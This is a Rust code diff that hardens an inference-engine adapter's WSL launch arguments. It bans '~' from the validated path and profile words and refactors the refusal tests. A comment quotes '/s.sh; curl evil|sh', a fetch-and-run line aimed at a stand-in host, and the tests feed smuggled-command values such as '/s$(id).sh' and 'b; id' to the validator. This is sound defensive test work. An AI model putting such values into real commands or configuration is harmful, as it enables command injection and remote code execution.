@@ -11,7 +11,11 @@
 //!
 //! Every ninfer model the catalog carries is managed: the operator's 2026-10-26
 //! call scrapped v3.3's `external: true` so the former bonsai servers are loaded
-//! and reaped here like any other, on harness-assigned publish ports.
+//! and reaped here like any other. The port comes from the harness's slot plan but
+//! reaches the container only as the script's `$3` **offer** — whether the
+//! autostart script publishes there is the operator's contract, unverifiable from
+//! here (FINDINGS-10 [5]); the harness's own evidence is that its readiness probes
+//! answer on that port, nothing more.
 
 use super::{EngineAdapter, EngineError, LaunchSpec, ReadinessSpec};
 use crate::model::ModelEntry;
@@ -38,11 +42,22 @@ pub struct NinferAdapter {
 /// `wsl.exe --` is re-tokenized by the login shell there, so a yaml value such as
 /// `/s.sh; curl evil|sh` would otherwise execute inside the distro (security
 /// review, 2026-10-26). Paths and profile names are plain words, never options.
+///
+/// `~` is deliberately NOT admitted anywhere in a word (FINDINGS2-0910 [6]): bash
+/// expands a leading `~` before it ever opens the file, so `~root/x.sh` would reach
+/// `/root/x.sh` and `~/x.sh` the wsl_user's home — a yaml word that looks like an
+/// absolute path in the catalog but names a file the operator did not write. The
+/// rule is the character class rather than bash's expansion positions: an interior
+/// `~` (inert to the shell) is refused too, deliberately, so one charset is the
+/// whole story. Every autostart path in the live catalog is already absolute
+/// (`/home/...`), and profile words never need it. What this rule still does NOT do
+/// is bound *which* absolute paths are admissible: the distro-side root allow-list
+/// is the ninfer `custody_roots` cell of chunk 10's `EnginePolicy` row.
 fn valid_word(value: &str) -> bool {
     !value.is_empty()
         && !value.starts_with('-')
         && value.chars().all(|c| {
-            c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '+' | '@' | '~')
+            c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '+' | '@')
         })
 }
 
@@ -58,7 +73,9 @@ impl NinferAdapter {
     }
 
     /// The autostart argv exactly as v3.3 built it: shared WSL client prefix,
-    /// then bash, script, profile, key flag, harness-assigned publish port.
+    /// then bash, script, profile, key flag, and the port offered as `$3` — the
+    /// harness's slot-plan port, which the script decides whether to publish
+    /// (the header's offer/contract sentence; 10[5]).
     fn argv(&self, script: &str, profile: &str, key: &str, port: u16) -> Vec<String> {
         let mut argv =
             crate::engine::wsl_prefix(&self.defaults.wsl_distro, &self.defaults.wsl_user);
@@ -108,7 +125,8 @@ impl EngineAdapter for NinferAdapter {
             .ok_or_else(|| missing("ninfer_autostart"))?;
         if !valid_word(&script) {
             return Err(rejected(format!(
-                "ninfer_autostart must be a plain WSL path (no spaces or shell metacharacters): {script}"
+                "ninfer_autostart must be a plain WSL path (no spaces, no shell \
+                 metacharacters, no leading `~`): {script}"
             )));
         }
         let container = model
@@ -316,15 +334,46 @@ mod tests {
         let err = NinferAdapter::new("Ubuntu", "ops")
             .spec(&entry(&[("ninfer_container", "c")]), 18109)
             .expect_err("must refuse");
-        assert!(
-            matches!(err, EngineError::MissingField { ref field, .. } if field == "ninfer_autostart")
-        );
+        match err {
+            EngineError::MissingField { field, .. } => assert_eq!(field, "ninfer_autostart"),
+            other => panic!("expected a MissingField refusal, got {other:?}"),
+        }
         let err = NinferAdapter::new("Ubuntu", "ops")
             .spec(&entry(&[("ninfer_autostart", "/s.sh")]), 18109)
             .expect_err("must refuse");
-        assert!(
-            matches!(err, EngineError::MissingField { ref field, .. } if field == "ninfer_container")
-        );
+        match err {
+            EngineError::MissingField { field, .. } => assert_eq!(field, "ninfer_container"),
+            other => panic!("expected a MissingField refusal, got {other:?}"),
+        }
+    }
+
+    /// FINDINGS2-0910 [6]: `~` is shell-active at a word start, so the login shell
+    /// that re-tokenizes everything after `wsl.exe --` would expand `~root/x.sh` to
+    /// `/root/x.sh` and `~/x.sh` to the wsl_user's home — a yaml word that reads
+    /// like an absolute path but names a file the operator never wrote. Both
+    /// autostart and profile words are held to the same rule; the live catalog's
+    /// paths are all absolute, so nothing legitimate depends on `~`.
+    #[test]
+    fn tilde_expanding_words_are_refused() {
+        for script in ["~root/guide/x/autostart.sh", "~/autostart.sh", "~"] {
+            let reason = refused(&[("ninfer_autostart", script), ("ninfer_container", "c")]);
+            assert!(reason.contains("plain WSL path"), "{script}: {reason}");
+        }
+        let reason = refused(&[
+            ("ninfer_autostart", "/s.sh"),
+            ("ninfer_container", "c"),
+            ("ninfer_profile", "~b"),
+        ]);
+        assert!(reason.contains("ninfer_profile"), "{reason}");
+        // The rule is the character class, not a simulation of bash's expansion
+        // positions: an interior `~` (inert to bash, legal as a filename) is refused
+        // too. Deliberately stricter — one charset, no shell-context reasoning
+        // required of the next reader — and no live autostart path needs it.
+        let reason = refused(&[
+            ("ninfer_autostart", "/home/u/a~b/autostart.sh"),
+            ("ninfer_container", "c"),
+        ]);
+        assert!(reason.contains("plain WSL path"), "{reason}");
     }
 
     #[test]
@@ -344,50 +393,37 @@ mod tests {
         assert_eq!(spec.container.as_deref(), Some("c"));
     }
 
+    /// The reason one hostile `raw` value earns, or a panic naming a value that was
+    /// wrongly admitted (the three shape rules share one refusal voice, so the tests
+    /// share one probe).
+    fn refused(pairs: &[(&str, &str)]) -> String {
+        match NinferAdapter::new("Ubuntu", "ops").spec(&entry(pairs), 18109) {
+            Err(EngineError::Rejected { reason, engine, .. }) => {
+                assert_eq!(engine, NINFER_ENGINE);
+                reason
+            }
+            other => panic!("expected a Rejected refusal, got {other:?}"),
+        }
+    }
+
     #[test]
     fn option_and_shell_shaped_values_are_refused_before_argv() {
         // The argv after `wsl.exe --` is re-tokenized by the login shell inside the
         // distro, so a yaml value is only safe as a plain word (security review,
         // 2026-10-26): option-shaped, spaced and metacharacter-bearing values die here.
         for bad in ["-c", "/s.sh; id", "/s$(id).sh", "/s.sh|sh", "/a b.sh"] {
-            let err = NinferAdapter::new("Ubuntu", "ops")
-                .spec(
-                    &entry(&[("ninfer_autostart", bad), ("ninfer_container", "c")]),
-                    18109,
-                )
-                .expect_err("script must be a plain path");
-            assert!(
-                matches!(&err, EngineError::Rejected { reason, .. }
-                    if reason.contains("plain WSL path")),
-                "{bad}: {err}"
-            );
+            let reason = refused(&[("ninfer_autostart", bad), ("ninfer_container", "c")]);
+            assert!(reason.contains("plain WSL path"), "{bad}: {reason}");
         }
-        let err = NinferAdapter::new("Ubuntu", "ops")
-            .spec(
-                &entry(&[
-                    ("ninfer_autostart", "/s.sh"),
-                    ("ninfer_container", "c"),
-                    ("ninfer_profile", "b; id"),
-                ]),
-                18109,
-            )
-            .expect_err("profile must be a plain word");
-        assert!(
-            matches!(&err, EngineError::Rejected { reason, .. }
-                if reason.contains("ninfer_profile")),
-            "{err}"
-        );
+        let reason = refused(&[
+            ("ninfer_autostart", "/s.sh"),
+            ("ninfer_container", "c"),
+            ("ninfer_profile", "b; id"),
+        ]);
+        assert!(reason.contains("ninfer_profile"), "{reason}");
         for name in ["-v", "_x", "a b"] {
-            let err = NinferAdapter::new("Ubuntu", "ops")
-                .spec(
-                    &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]),
-                    18109,
-                )
-                .expect_err("container name must be docker-legal");
-            assert!(
-                matches!(&err, EngineError::Rejected { reason, .. } if reason.contains("docker name")),
-                "{name}: {err}"
-            );
+            let reason = refused(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]);
+            assert!(reason.contains("docker name"), "{name}: {reason}");
         }
     }
 
@@ -398,17 +434,8 @@ mod tests {
         // the claim ledger use — before it can reach the pre-reap argv and delete an
         // unrelated container in the operator's distro.
         for name in ["1234abc", "beef", "deadbeef"] {
-            let err = NinferAdapter::new("Ubuntu", "ops")
-                .spec(
-                    &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]),
-                    18109,
-                )
-                .expect_err("an ID-shaped name cannot be owned");
-            assert!(
-                matches!(&err, EngineError::Rejected { reason, .. }
-                    if reason.contains("docker name")),
-                "{name}: {err}"
-            );
+            let reason = refused(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]);
+            assert!(reason.contains("docker name"), "{name}: {reason}");
         }
         assert_eq!(
             NinferAdapter::new("Ubuntu", "ops")
